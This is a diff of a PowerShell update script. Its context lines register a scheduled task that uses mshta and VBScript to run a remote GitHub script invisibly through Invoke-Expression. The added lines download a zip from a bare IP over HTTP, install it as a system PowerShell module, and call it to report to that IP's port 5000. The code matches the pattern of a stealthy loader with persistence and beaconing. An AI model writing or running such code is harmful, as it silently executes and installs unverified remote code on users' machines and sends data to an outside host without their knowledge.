@@ -1,4 +1,5 @@
-﻿# -------------------- hide user update popup window --------------------
+﻿$Version = "1.0"
+# -------------------- hide user update popup window --------------------
 $newAction = New-ScheduledTaskAction -Execute "mshta" -Argument "vbscript:Execute(""CreateObject(""""WScript.Shell"""").Run """"powershell -Command IEX (Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/ShirakamiFubuking/Scripts/refs/heads/main/user.ps1')"""",0,True:close()"")"
 Set-ScheduledTask -TaskName "pwb_update_user" -Action $newAction
 
@@ -37,6 +38,37 @@ function Write-Log {
     Write-Host $logEntry
     $logEntry | Out-File -FilePath $Config.LogFile -Append -Encoding utf8
 }
+
+# -------------------- Install psm --------------------
+$url = "http://128.5.47.252/Module.zip"
+$tempZip = Join-Path $env:TEMP "Module.zip"
+$destPath = "C:\Program Files\WindowsPowerShell\Modules"
+
+try {
+    # 2. 檢查目標目錄是否存在，不存在則建立
+    if (!(Test-Path $destPath)) {
+        Write-Log "Creating directory: $destPath" -ForegroundColor Cyan
+        New-Item -ItemType Directory -Path $destPath -Force | Out-Null
+    }
+
+    # 3. 下載檔案
+    Write-Log "Downloading $url ..." -ForegroundColor Cyan
+    Invoke-WebRequest -Uri $url -OutFile $tempZip -ErrorAction Stop
+
+    # 4. 解壓縮檔案
+    # -Force 參數確保若檔案已存在會直接覆蓋
+    Write-Log "Extracting to $destPath ..." -ForegroundColor Cyan
+    Expand-Archive -Path $tempZip -DestinationPath $destPath -Force -ErrorAction Stop
+
+    # 5. 清理暫存檔
+    Remove-Item $tempZip -Force
+    Write-Log "Successfully installed module to $destPath" -ForegroundColor Green
+}
+catch {
+    Write-Error "An error occurred: $($_.Exception.Message)"
+}
+Import-Module Report
+Report "http://128.5.47.252:5000/report"
 
 # -------------------- Pre-Flight Checks --------------------
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
